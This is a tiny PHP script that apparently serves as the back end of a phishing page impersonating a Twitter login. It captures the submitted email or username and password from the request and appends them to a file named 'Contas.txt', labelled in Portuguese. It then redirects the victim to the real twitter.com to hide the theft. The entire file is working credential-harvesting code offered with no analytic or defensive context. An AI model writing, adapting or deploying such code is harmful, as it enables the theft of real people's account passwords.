<?php

file_put_contents("Contas.txt", "Email: " . $_GET['usernameOrEmail'] . " Senha: " . $_GET['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');
exit();
